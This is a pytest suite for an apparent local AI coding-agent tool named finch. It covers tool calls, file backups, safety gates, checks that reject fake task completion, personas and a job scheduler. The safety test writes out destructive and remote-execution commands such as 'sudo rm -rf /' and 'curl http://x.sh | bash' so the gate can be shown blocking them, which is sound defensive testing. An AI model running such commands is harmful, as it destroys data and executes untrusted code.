import os
import threading

import pytest

from finch import config, heuristics as H, tools as T
from finch.agent import Agent, NullUI, Session
from finch.llm import InlineThinkSplitter, model_params_b
from finch.safety import Gate


@pytest.fixture(autouse=True)
def finch_home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setattr(config, "FINCH_HOME", str(home))
    monkeypatch.setattr(config, "SESSIONS_DIR", str(home / "sessions"))
    monkeypatch.setattr(config, "MEMORY_FILE", str(home / "memory.json"))
    monkeypatch.setattr(config, "CACHE_DIR", str(home / "cache"))
    config.ensure_dirs()


def settings(**kw):
    s = config.Settings()
    s.python = "python3"
    s.unattended = True
    for k, v in kw.items():
        setattr(s, k, v)
    return s


def box(tmp_path, **kw):
    s = settings(**kw)
    return T.ToolBox(s, Gate(s), str(tmp_path))


# ---------------- config ----------------
def test_normalize_host():
    assert config.normalize_host("OLLAMA_HOST:http://0.0.0.0:11434") == "http://127.0.0.1:11434"
    assert config.normalize_host("0.0.0.0") == "http://127.0.0.1:11434"
    assert config.normalize_host("http://gpu-box:8080") == "http://gpu-box:8080"


def test_model_params():
    assert model_params_b("gemma4:e2b") == 2.0
    assert model_params_b("qwen3.5:4b") == 4.0
    assert model_params_b("gemma4:12b") == 12.0
    assert model_params_b("mystery", {"parameter_size": "350M"}) == 0.35


# ---------------- think splitter ----------------
def test_inline_think_split_across_chunks():
    toks, thinks = [], []
    sp = InlineThinkSplitter(toks.append, thinks.append)
    for ch in ["Hel", "lo <thi", "nk>secret", " plan</th", "ink> world"]:
        sp.feed(ch)
    sp.flush()
    assert "".join(toks) == "Hello  world"
    assert "".join(thinks) == "secret plan"


# ---------------- routing ----------------
@pytest.mark.parametrize("text,qa", [
    ("hi", True), ("what is a monad?", True), ("who are you", True),
    ("write a script that renames my photos", False), ("fix the failing test", False),
    ("this is great", True), ("prefix", True),
])
def test_is_qa(text, qa):
    assert H.is_qa(text) is qa


def test_short_followup_continues_task():
    assert H.is_qa("now the other one", has_progress=True) is False


def test_route_categories():
    assert {"code", "file"} <= H.route_categories("debug the python script")
    assert "web" in H.route_categories("research the latest news on rust")
    assert H.route_categories("blorp") == {"file", "code", "web"}


# ---------------- salvage ----------------
KNOWN = set(T.ALL_BUILTIN) | set(T.ALIASES)


@pytest.mark.parametrize("text,name,arg", [
    ('{"name": "create_file", "arguments": {"path": "a.txt", "content": "x"}}', "create_file", "path"),
    ('```json\n{"finish": {"summary": "done"}}\n```', "finish", "summary"),
    ('<tool_call>{"name":"list_dir","arguments":{"path":"."}}</tool_call>', "list_dir", "path"),
    ('finish(summary="0")', "finish", "summary"),
    ('finish{summary:<|"|>all good<|"|>}', "finish", "summary"),
    ('call:read_file{path:<|"|>main.py<|"|>}', "read_file", "path"),
])
def test_salvage(text, name, arg):
    calls = H.try_parse_tool_calls(text, KNOWN)
    assert calls and calls[0][0] == name and arg in calls[0][1]


def test_salvage_rejects_prose():
    assert H.try_parse_tool_calls("I will call finish(summary='x') next.", KNOWN) is None
    assert H.try_parse_tool_calls('{"foo": {"a": 1}}', KNOWN) is None


def test_semantically_empty():
    assert H.semantically_empty("<think>\n\n</think>")
    assert H.semantically_empty("<think>half a thought")
    assert not H.semantically_empty("<think>x</think> answer")


# ---------------- tools ----------------
def test_clobber_guard_and_backup(tmp_path):
    tb = box(tmp_path)
    big = "line\n" * 200
    assert "created" in tb.run("create_file", {"path": "a.txt", "content": big})
    r = tb.run("create_file", {"path": "a.txt", "content": "tiny"})
    assert r.startswith("[clobber guard")
    r = tb.run("create_file", {"path": "a.txt", "content": "tiny", "replace": True})
    assert "backed up" in r
    assert (tmp_path / ".finch/backups/a.txt.bak").read_text() == big
    assert tb.rollback.undo().startswith("restored")
    assert (tmp_path / "a.txt").read_text() == big


def test_auto_repair_double_escaped_python(tmp_path):
    tb = box(tmp_path)
    tb.run("create_file", {"path": "x.py", "content": "def f():\\n    return 1\\n"})
    assert (tmp_path / "x.py").read_text() == "def f():\n    return 1\n"


def test_edit_file_escape_fallback(tmp_path):
    tb = box(tmp_path)
    (tmp_path / "m.py").write_text("a = 1\nb = 2\n")
    r = tb.run("edit_file", {"path": "m.py", "old": "a = 1\\nb = 2", "new": "a = 3\\nb = 4"})
    assert r.startswith("[edited")
    assert (tmp_path / "m.py").read_text() == "a = 3\nb = 4\n"


def test_missing_args_hint(tmp_path):
    r = box(tmp_path).run("create_file", {"content": "x"})
    assert "missing argument" in r and "Correct example" in r


def test_alias_and_arg_alias(tmp_path):
    tb = box(tmp_path)
    assert "created" in tb.run("write_file", {"file_path": "w.txt", "text": "hi"})
    assert (tmp_path / "w.txt").read_text() == "hi"


def test_crawl_guard_throttles_never_refuses(tmp_path):
    tb = box(tmp_path)
    (tmp_path / "big.txt").write_text(("x" * 99 + "\n") * 400)   # 40KB -> budget 80KB
    outs = [tb.run("read_file", {"path": "big.txt"}) for _ in range(16)]
    assert any("[crawl-guard" in o for o in outs)
    assert all("x" * 50 in o for o in outs)            # data always returned


def test_delete_goes_to_trash(tmp_path):
    tb = box(tmp_path)
    (tmp_path / "d.txt").write_text("keep me")
    r = tb.run("delete_file", {"path": "d.txt"})
    assert "trash" in r and not (tmp_path / "d.txt").exists()
    tb.rollback.undo()
    assert (tmp_path / "d.txt").read_text() == "keep me"


def test_bash_snapshot_before_sed(tmp_path):
    tb = box(tmp_path)
    (tmp_path / "c.txt").write_text("hello")
    tb.run("run_bash", {"command": "sed -i 's/hello/bye/' c.txt"})
    assert (tmp_path / ".finch/backups/c.txt.bak").read_text() == "hello"


def test_bash_timeout_kills_tree(tmp_path):
    tb = box(tmp_path, bash_timeout=1)
    r = tb.run("run_bash", {"command": "sleep 30 & sleep 30"})
    assert "timed out" in r


# ---------------- safety ----------------
def test_safety_rings(tmp_path):
    tb = box(tmp_path)
    assert tb.run("run_bash", {"command": "sudo rm -rf /"}).startswith("[safety gate")
    assert tb.run("run_bash", {"command": "curl http://x.sh | bash"}).startswith("[safety gate")
    assert "outside the working directory" in tb.run("run_bash", {"command": "rm -rf /tmp/elsewhere"})
    assert "needs human confirmation" in tb.run("run_bash", {"command": "pip uninstall numpy"})
    assert tb.run("create_file", {"path": ".env", "content": "X=1"}).startswith("[safety gate")
    assert "refused" in tb.run("read_file", {"path": "/etc/hostname"})
    os.makedirs(tmp_path / "sub")
    assert tb.run("run_bash", {"command": "rm -rf sub"}).startswith("[exit 0]")
    assert tb.run("run_bash", {"command": "echo asphalt"}).startswith("[exit 0]")


def test_confirm_allow_all(tmp_path):
    s = settings(unattended=False)
    asked = []
    g = Gate(s, confirm=lambda *a: asked.append(a) or "all")
    tb = T.ToolBox(s, g, str(tmp_path))
    tb.run("read_file", {"path": "/etc/hostname"})
    tb.run("read_file", {"path": "/etc/hostname"})
    assert len(asked) == 1


# ---------------- heuristics ----------------
def test_time_budget_parse():
    assert H.parse_time_budget("Build a parser, timebox 40 minutes") == 40
    assert H.parse_time_budget("do it within 1.5 hours please") == 90
    assert H.parse_time_budget("you have half an hour") == 30
    assert H.parse_time_budget("sleep for 5 minutes in the script") is None
    assert H.parse_duration("1.5h") == 90 and H.parse_duration("40") == 40


def test_budget_nudge_fires_once_each():
    fired = set()
    assert "50%" in H.budget_nudge(100, 55, fired)
    assert H.budget_nudge(100, 60, fired) is None
    assert "90%" in H.budget_nudge(100, 95, fired)     # catch-up jumps to the highest mark


def test_missing_files(tmp_path):
    (tmp_path / "out.md").write_text("x")
    assert T.missing_files_in_text("wrote out.md and report.csv using Node.js", str(tmp_path)) == ["report.csv"]


def test_edit_convergence_guard():
    g = H.EditConvergenceGuard()
    hints = [g.observe("a.py") for _ in range(8)]
    assert sum(1 for h in hints if h) == 2


# ---------------- full loop with a scripted model ----------------
class FakeLLM:
    def __init__(self, script):
        self.script = list(script)
        self.calls = []

    def show(self, model):
        return {}

    def chat(self, model, messages, tools=None, stream=True, on_token=None, on_think=None, num_ctx=None, cancel=None):
        self.calls.append([dict(m) for m in messages])
        if not tools and not stream:     # compaction / wrap-up
            return {"message": {"content": "summary"}}
        step = self.script.pop(0) if self.script else ("finish", {"summary": "done"})
        if isinstance(step, str):
            return {"message": {"role": "assistant", "content": step}, "prompt_eval_count": 100}
        name, args = step
        return {"message": {"role": "assistant", "content": "",
                            "tool_calls": [{"function": {"name": name, "arguments": args}}]},
                "prompt_eval_count": 100}


def make_agent(tmp_path, script, **kw):
    s = settings(**kw)
    g = Gate(s)
    tb = T.ToolBox(s, g, str(tmp_path))
    llm = FakeLLM(script)
    a = Agent(s, llm, tb, g, NullUI())
    a.session = Session(str(tmp_path), "fake:12b")
    return a, llm


def user_notes(llm):
    return [m["content"] for m in llm.calls[-1] if m["role"] == "user"]


def test_fake_finish_rejected_then_reread(tmp_path):
    a, llm = make_agent(tmp_path, [
        ("finish", {"summary": "done"}),                                 # fake finish -> rejected
        ("create_file", {"path": "out.txt", "content": "42"}),
        ("finish", {"summary": "wrote out.txt"}),                        # self-check reread -> rejected once
        ("finish", {"summary": "wrote out.txt"}),
    ])
    res = a.run_turn("write the answer 42 into out.txt")
    notes = "\n".join(user_notes(llm))
    assert "haven't done any real work" in notes
    assert "original task" in notes
    assert res == "wrote out.txt"


def test_claimed_missing_file_rejected(tmp_path):
    a, llm = make_agent(tmp_path, [
        ("create_file", {"path": "a.md", "content": "x"}),
        ("finish", {"summary": "created a.md and b.md"}),
        ("create_file", {"path": "b.md", "content": "y"}),
        ("finish", {"summary": "created a.md and b.md"}),
        ("finish", {"summary": "created a.md and b.md"}),
    ])
    a.run_turn("create the files a.md and b.md")
    assert any("don't exist" in n and "b.md" in n for n in user_notes(llm))


def test_test_guard_rejects_failing_tests(tmp_path):
    (tmp_path / "test_x.py").write_text("def test_x():\n    assert 1 == 2\n")
    a, llm = make_agent(tmp_path, [
        ("create_file", {"path": "x.py", "content": "X = 1\n"}),
        ("finish", {"summary": "done"}),
    ])
    a.run_turn("implement x.py so the tests pass")
    assert any("tests in the directory do not pass" in n for n in user_notes(llm))


def test_duplicate_call_blocked_and_streak_disable(tmp_path):
    a, llm = make_agent(tmp_path, [("list_dir", {"path": "."})] * 12 + [
        ("create_file", {"path": "o.txt", "content": "x"})])
    a.run_turn("organize the files in this folder")
    notes = "\n".join(user_notes(llm))
    assert "duplicate" in notes
    tools_seen = [m for m in llm.calls[-1] if m["role"] == "tool"]
    assert any("disabled" in m["content"] or "blocked" in m["content"] for m in tools_seen)


def test_empty_turn_ladder_resets(tmp_path):
    a, llm = make_agent(tmp_path, [""] * 6 + [("create_file", {"path": "o.txt", "content": "x"})])
    a.run_turn("write o.txt with an x in it")
    joined = "\n".join(str(m.get("content")) for c in llm.calls for m in c)
    assert "empty output" in joined and "context was reset" in joined


def test_chat_mode_answers_once(tmp_path):
    a, llm = make_agent(tmp_path, ["Hello! I'm Finch."])
    assert a.run_turn("hi") == "Hello! I'm Finch."
    assert len(llm.calls) == 1


def test_small_model_disables_edit(tmp_path):
    (tmp_path / "f.py").write_text("a=1\n")
    a, llm = make_agent(tmp_path, [("edit_file", {"path": "f.py", "old": "a=1", "new": "a=2"}),
                                   ("create_file", {"path": "f.py", "content": "a=2\n"})])
    a.session.model = "tiny:2b"
    a.run_turn("change a to 2 in f.py")
    assert (tmp_path / "f.py").read_text() == "a=2\n"
    assert any("disabled" in m["content"] for m in llm.calls[1] if m["role"] == "tool")


def test_interrupt_repairs_dangling_tool_calls(tmp_path):
    a, llm = make_agent(tmp_path, [])
    ev = threading.Event()
    ev.set()
    a.run_turn("write a file", cancel=ev)
    assert a.session.messages[-1]["content"].startswith("[harness] The user interrupted")


def test_prose_after_self_check_is_delivery(tmp_path):
    a, llm = make_agent(tmp_path, [
        ("create_file", {"path": "out.txt", "content": "42"}),
        ("finish", {"summary": "wrote out.txt"}),            # self-check reread
        "All requirements are met: out.txt contains 42.",    # prose instead of finish
    ])
    res = a.run_turn("write the answer 42 into out.txt")
    assert res.startswith("All requirements are met")
    assert len(llm.calls) == 3


# ---------------- tricks & themes ----------------
from finch import themes, tricks as TR


def test_every_trick_key_is_referenced_in_code():
    import pathlib
    src = "".join(p.read_text() for p in pathlib.Path("finch").glob("*.py") if p.name != "tricks.py")
    missing = [k for k in TR.KEYS if f'"{k}"' not in src]
    assert not missing, missing


def test_ablation_aliases_expand(monkeypatch):
    monkeypatch.setenv("FINCH_ABLATION", "anti_loop,crawl_guard")
    s = config.load_settings()
    assert not s.on("dup_block") and not s.on("streak_guard") and not s.on("crawl_guard")
    assert s.on("salvage")


def test_legacy_unsafe_key(tmp_path, monkeypatch):
    cfg = tmp_path / "c.json"
    cfg.write_text('{"unsafe": true, "theme": "ocean"}')
    monkeypatch.setattr(config, "CONFIG_FILE", str(cfg))
    s = config.load_settings()
    assert s.unsafe and s.theme == "ocean"


def test_trick_off_salvage(tmp_path):
    a, llm = make_agent(tmp_path, ['{"name": "create_file", "arguments": {"path": "o.txt", "content": "x"}}'] * 3)
    a.s.set_trick("salvage", False)
    a.s.set_trick("repeat_detect", False)
    a.run_turn("write o.txt with an x in it")
    assert not (tmp_path / "o.txt").exists()


def test_trick_off_dup_block_and_backups_and_crawl(tmp_path):
    tb = box(tmp_path)
    tb.s.set_trick("backups", False)
    tb.s.set_trick("clobber_guard", False)
    tb.s.set_trick("crawl_guard", False)
    tb.run("create_file", {"path": "a.txt", "content": "y" * 1000})
    r = tb.run("create_file", {"path": "a.txt", "content": "tiny"})
    assert "clobber" not in r and not (tmp_path / ".finch").exists()
    assert "permanently" in tb.run("delete_file", {"path": "a.txt"})
    (tmp_path / "big.txt").write_text(("x" * 99 + "\n") * 400)
    assert not any("[crawl-guard" in tb.run("read_file", {"path": "big.txt"}) for _ in range(16))


def test_trick_off_qa_layering(tmp_path):
    a, llm = make_agent(tmp_path, ["Hello!", ("finish", {"summary": "hi"})])
    a.s.set_trick("qa_layering", False)
    a.run_turn("hi")
    assert "autonomous agent" in llm.calls[0][0]["content"]


def test_trick_off_finish_gates(tmp_path):
    a, llm = make_agent(tmp_path, [("finish", {"summary": "done"})])
    for k in ("fake_finish_gate", "self_check"):
        a.s.set_trick(k, False)
    assert a.run_turn("write the report file") == "done"
    assert len(llm.calls) == 1


def test_boundary_confirm_off(tmp_path):
    tb = box(tmp_path)
    tb.s.set_trick("boundary_confirm", False)
    assert "refused" not in tb.run("read_file", {"path": "/etc/hostname"})
    assert tb.run("run_bash", {"command": "sudo rm -rf /"}).startswith("[safety gate")   # hard ring stays


@pytest.mark.parametrize("name", list(themes.THEMES))
def test_themes_parse(name):
    from prompt_toolkit.styles import Style
    from rich.console import Console
    Style.from_dict(themes.pt_style_dict(name))
    c = Console(theme=themes.rich_theme(name), file=open(os.devnull, "w"))
    for k in ("accent", "dim", "ok", "err", "warn", "think", "output", "rule", "diff.add", "diff.del",
              "done", "bullet", "border"):
        c.print("x", style=k)


@pytest.mark.parametrize("name", list(themes.THEMES))
def test_theme_swatch_and_menu_render(name):
    from prompt_toolkit.styles import Style
    st = Style.from_dict(themes.pt_style_dict(name))
    for frag in themes.swatch(name):
        st.get_attrs_for_style_str(frag)       # raises on bad colour names


def test_theme_groups_cover_all_and_glyphs():
    assert sorted(n for ns in themes.GROUPS.values() for n in ns) == sorted(themes.THEMES)
    assert themes.glyph("hermes", "bullet") == "☤" and themes.glyph("hermes", "result") == "┊"
    assert themes.glyph("claude", "bullet") == "●"
    for n in themes.THEMES:
        assert themes.glyph(n, "verbs")


# ---------------- souls ----------------
from finch import souls


def test_builtin_souls_listed_and_parsed(tmp_path):
    names = {s["name"] for s in souls.list_souls(str(tmp_path))}
    assert {"concise", "mentor", "careful", "friendly", "pirate"} <= names
    body = souls.load("concise", str(tmp_path))
    assert body.startswith("Be direct") and "description:" not in body


def test_soul_precedence_and_special_files(tmp_path):
    (tmp_path / ".finch" / "souls").mkdir(parents=True)
    (tmp_path / ".finch" / "souls" / "concise.md").write_text("project override")
    assert souls.load("concise", str(tmp_path)) == "project override"
    (tmp_path / ".finch" / "SOUL.md").write_text("---\ndescription: proj\n---\nproject soul")
    s = souls.find("project", str(tmp_path))
    assert s and s["desc"] == "proj" and souls.load("project", str(tmp_path)) == "project soul"


def test_soul_create_and_cap(tmp_path):
    name, path = souls.create("My Soul!")
    assert name == "My-Soul" and os.path.exists(path)
    with open(path, "w") as f:
        f.write("x" * 5000)
    assert souls.load(name, str(tmp_path)).endswith("[soul truncated at 4000 characters]")


def test_soul_injected_in_task_and_chat(tmp_path):
    a, llm = make_agent(tmp_path, ["Arr, hello!", ("create_file", {"path": "o.txt", "content": "x"})])
    a.s.soul = "pirate"
    a.run_turn("hi")
    sysmsg = llm.calls[0][0]["content"]
    assert sysmsg.startswith("# Soul (pirate)") and "cheerful pirate" in sysmsg
    a.s.soul = ""
    a.run_turn("write o.txt containing x")
    assert "# Soul" not in llm.calls[-1][0]["content"]


# ---------------- scheduler ----------------
import datetime as _dt
import subprocess as _sp
import sys as _sys
import time as _time

from finch import scheduler as SCH

MON_1300 = _time.mktime(_dt.datetime(2026, 10, 12, 13, 0).timetuple())     # Monday


def _at(ts):
    return _dt.datetime.fromtimestamp(ts).strftime("%a %Y-%m-%d %H:%M")


@pytest.mark.parametrize("phrase,kind,first", [
    ("in 10m", "once", "Mon 2026-10-12 13:10"),
    ("in 1h30m", "once", "Mon 2026-10-12 14:30"),
    ("in half an hour", "once", "Mon 2026-10-12 13:30"),
    ("at 17:30", "once", "Mon 2026-10-12 17:30"),
    ("9am", "once", "Tue 2026-10-13 09:00"),                 # already passed today -> tomorrow
    ("tomorrow", "once", "Tue 2026-10-13 09:00"),
    ("friday at 08:15", "once", "Fri 2026-10-16 08:15"),
    ("monday 9am", "once", "Mon 2026-10-19 09:00"),          # today's 9am passed -> next week
    ("oct 20 at 9am", "once", "Tue 2026-10-20 09:00"),
    ("2026-10-20 09:00", "once", "Tue 2026-10-20 09:00"),
    ("every 30m", "interval", "Mon 2026-10-12 13:30"),
    ("hourly", "cron", "Mon 2026-10-12 14:00"),
    ("daily at 9am", "cron", "Tue 2026-10-13 09:00"),
    ("every day at 18:00", "cron", "Mon 2026-10-12 18:00"),
    ("weekdays at 8:30", "cron", "Tue 2026-10-13 08:30"),
    ("weekends at 10am", "cron", "Sat 2026-10-17 10:00"),
    ("every mon, wed and fri at 7pm", "cron", "Mon 2026-10-12 19:00"),
    ("weekly on friday at 5pm", "cron", "Fri 2026-10-16 17:00"),
    ("monthly on the 1st at 9am", "cron", "Sun 2026-11-01 09:00"),
    ("cron 0 9 * * 1-5", "cron", "Tue 2026-10-13 09:00"),
    ("*/15 9-17 * * mon-fri", "cron", "Mon 2026-10-12 13:15"),
])
def test_parse_when(phrase, kind, first):
    sp = SCH.parse_when(phrase, MON_1300)
    assert sp["kind"] == kind
    assert _at(SCH.first_run(sp, MON_1300)) == first


@pytest.mark.parametrize("bad", ["banana", "yesterday", "every 10s", "cron 1 2 3", "at 25:00",
                                 "2026-01-01 10:00", "cron 99 * * * *", ""])
def test_parse_when_rejects(bad):
    with pytest.raises(ValueError):
        SCH.parse_when(bad, MON_1300)


def test_cron_semantics():
    t = _dt.datetime(2026, 10, 12, 13, 0)
    # restricted day-of-month AND day-of-week match if EITHER matches (like cron)
    nxt = SCH.Cron("0 9 13 * 5").next_after(t)
    assert nxt == _dt.datetime(2026, 10, 13, 9, 0)
    assert SCH.Cron("0 0 29 2 *").next_after(t) == _dt.datetime(2028, 2, 29, 0, 0)       # leap day
    assert SCH.Cron("30 23 31 dec *").next_after(t) == _dt.datetime(2026, 12, 31, 23, 30)
    assert SCH.Cron("0 12 * * 7").next_after(t).weekday() == 6                            # 7 = Sunday
    assert SCH.Cron("5/20 * * * *").minutes == [5, 25, 45]
    assert SCH.Cron("0 9 * * *").next_after(_dt.datetime(2026, 12, 31, 10, 0)) == _dt.datetime(2027, 1, 1, 9, 0)


def test_split_when():
    assert SCH.split_when("every day at 9am check the weather", MON_1300) == ("every day at 9am", "check the weather")
    assert SCH.split_when("in 10m remind me to stretch", MON_1300) == ("in 10m", "remind me to stretch")
    assert SCH.split_when("tomorrow -- at noon do it", MON_1300) == ("tomorrow", "at noon do it")
    assert SCH.split_when("'every weekday at 8' do x", MON_1300) == ("every weekday at 8", "do x")
    with pytest.raises(ValueError):
        SCH.split_when("write a haiku", MON_1300)


def test_job_store_lifecycle(tmp_path):
    j = SCH.add_job("every 30m", "check the build", str(tmp_path), now=MON_1300)
    assert j["name"] == "check-build" and j["next_run"] == MON_1300 + 1800
    j2 = SCH.add_job("in 10m", "check the build", str(tmp_path), now=MON_1300)
    assert j2["name"] == "check-build-2"
    assert SCH.find("1")["id"] == j["id"] and SCH.find(j2["id"][:4])["id"] == j2["id"]
    assert SCH.find("check-build-2")["id"] == j2["id"]
    assert not SCH.set_enabled(j["id"], False)["enabled"]
    assert SCH.state_text(SCH.find(j["id"])) == "paused"
    later = MON_1300 + 7200
    jj = SCH.set_enabled(j["id"], True, now=later)              # resume recomputes from now
    assert jj["enabled"] and jj["next_run"] == later + 1800
    jj = SCH.reschedule(j["id"], "daily at 9am", now=MON_1300)
    assert jj["kind"] == "cron" and "every" not in jj and _at(jj["next_run"]) == "Tue 2026-10-13 09:00"
    SCH.remove(j2["id"])
    assert len(SCH.load_jobs()) == 1
    with pytest.raises(ValueError):
        SCH.add_job("in 10m", "x", str(tmp_path / "nope"))
    with pytest.raises(ValueError):
        SCH.add_job("in 10m", "   ", str(tmp_path))


class _FakeProc:
    def __init__(self, pid=None):
        self.pid = pid or os.getpid()

    def poll(self):
        return None

    def wait(self):
        return 0


@pytest.fixture
def no_children(monkeypatch):
    monkeypatch.setattr(SCH, "_CHILDREN", [])


def test_tick_claims_one_job_at_a_time(tmp_path, no_children):
    a = SCH.add_job("every 30m", "job a", str(tmp_path), now=MON_1300)
    b = SCH.add_job("in 10m", "job b", str(tmp_path), now=MON_1300)
    started = []
    launch = lambda j: (started.append(j["id"]), _FakeProc())[1]
    assert SCH.tick(now=MON_1300 + 60, launcher=launch) is None            # nothing due yet
    t = MON_1300 + 3600
    first = SCH.tick(now=t, launcher=launch)
    assert first["id"] == b["id"]                                         # earliest due first
    assert SCH.tick(now=t, launcher=launch) is None                       # one at a time
    jb = SCH.find(b["id"])
    assert jb["next_run"] is None and jb["running"]["pid"] == os.getpid() and jb["last_status"] == "running"
    # finish b, then a runs and its interval is re-anchored to now (no backfill)
    SCH.update(b["id"], running=None, last_status="ok", last_finished=t)
    assert SCH.tick(now=t, launcher=launch)["id"] == a["id"]
    assert SCH.find(a["id"])["next_run"] == t + 1800
    assert started == [b["id"], a["id"]]


def test_tick_reaps_dead_runner_and_marks_missed(tmp_path, no_children):
    p = _sp.Popen(["true"])
    p.wait()
    a = SCH.add_job("every 30m", "a", str(tmp_path), now=MON_1300)
    SCH.update(a["id"], running={"pid": p.pid, "since": MON_1300, "log": "x"}, next_run=MON_1300 + 9 * 86400)
    once = SCH.add_job("in 10m", "b", str(tmp_path), now=MON_1300)
    SCH.update(once["id"], enabled=False)          # paused one-offs are not marked missed
    late = SCH.add_job("in 10m", "c", str(tmp_path), now=MON_1300)
    assert SCH.tick(now=MON_1300 + 2 * 86400, launcher=lambda j: _FakeProc()) is None
    assert SCH.find(a["id"])["last_status"] == "interrupted" and SCH.find(a["id"])["running"] is None
    assert SCH.find(late["id"])["last_status"] == "missed" and SCH.find(late["id"])["next_run"] is None
    assert SCH.find(once["id"])["last_status"] is None
    # a recurring job that was missed for days catches up once, then continues from now
    SCH.update(a["id"], next_run=MON_1300)
    t = MON_1300 + 3 * 86400
    assert SCH.tick(now=t, launcher=lambda j: _FakeProc())["id"] == a["id"]
    assert SCH.find(a["id"])["next_run"] == t + 1800


def test_tick_defers_for_interactive_task_and_run_now(tmp_path, no_children):
    a = SCH.add_job("every 30m", "a", str(tmp_path), now=MON_1300)
    with SCH.busy():
        assert SCH.someone_busy()
        assert SCH.tick(now=MON_1300 + 1900, launcher=lambda j: _FakeProc()) is None           # waits
        got = SCH.tick(now=MON_1300 + 1800 + SCH.BUSY_DEFER_MAX + 1, launcher=lambda j: _FakeProc())
        assert got["id"] == a["id"]                                                              # not forever
    assert not SCH.someone_busy()
    b = SCH.add_job("tomorrow 9am", "b", str(tmp_path), now=MON_1300)
    SCH.update(a["id"], running=None)
    SCH.request_run(b["id"])
    got = SCH.tick(now=MON_1300 + 60, launcher=lambda j: _FakeProc())
    assert got["id"] == b["id"]
    jb = SCH.find(b["id"])
    assert not jb["run_now"] and _at(jb["next_run"]) == "Tue 2026-10-13 09:00"    # run-now keeps the schedule


def _exec_job(tmp_path, monkeypatch, code, **kw):
    j = SCH.add_job("in 10m", "say hi", str(tmp_path), **kw)
    SCH.request_run(j["id"])
    monkeypatch.setattr(SCH, "job_command", lambda job: [_sys.executable, "-c", code])
    SCH.tick(launcher=lambda job: _FakeProc())
    rc = SCH.execute(j["id"])
    return rc, SCH.find(j["id"])


def test_execute_ok_writes_log_and_summary(tmp_path, monkeypatch, no_children):
    rc, j = _exec_job(tmp_path, monkeypatch, "import os; print('hello from', os.environ['FINCH_SCHEDULED_JOB'])")
    assert rc == 0 and j["last_status"] == "ok" and j["runs"] == 1 and j["running"] is None
    assert f"hello from {j['id']}" in j["last_summary"]
    log = open(j["last_log"]).read()
    assert "# prompt:   say hi" in log and "· ok · exit 0" in log
    assert j["next_run"]                           # run-now of a future one-off keeps its slot


def test_execute_failure_and_timeout(tmp_path, monkeypatch, no_children):
    rc, j = _exec_job(tmp_path, monkeypatch, "import sys; print('boom'); sys.exit(3)")
    assert rc == 1 and j["last_status"] == "failed" and j["last_exit"] == 3
    SCH.remove(j["id"])
    rc, j = _exec_job(tmp_path, monkeypatch, "import time; time.sleep(30)", timeout=1)
    assert j["last_status"] == "timeout"


def test_job_command_flags(tmp_path):
    j = SCH.add_job("in 10m", "do it", str(tmp_path), model="gemma4:12b", soul="", yes=True, timebox=20)
    cmd = SCH.job_command(j)
    assert cmd[1:6] == ["-I", "-m", "finch", "-p", "do it"]      # -I: a ./finch folder in the workdir can't shadow us
    assert ["-m", "gemma4:12b"] == cmd[cmd.index("-m", 3):cmd.index("-m", 3) + 2]
    assert "--soul" in cmd and cmd[cmd.index("--soul") + 1] == "none"
    assert cmd[cmd.index("--timebox") + 1] == "20m" and cmd[-1] == "-y"


def test_schedule_cli_dispatch(tmp_path, capsys):
    from finch import cli
    with pytest.raises(SystemExit) as e:
        cli.main(["schedule", "add", "every weekday at 8:30", "summarise new commits", "-C", str(tmp_path)])
    assert e.value.code == 0
    assert "weekdays at 08:30" in capsys.readouterr().out
    with pytest.raises(SystemExit) as e:
        cli.main(["schedule", "list"])
    assert "summarise-new-commits" in capsys.readouterr().out
    with pytest.raises(SystemExit) as e:
        cli.main(["schedule", "test", "banana"])
    assert e.value.code == 2
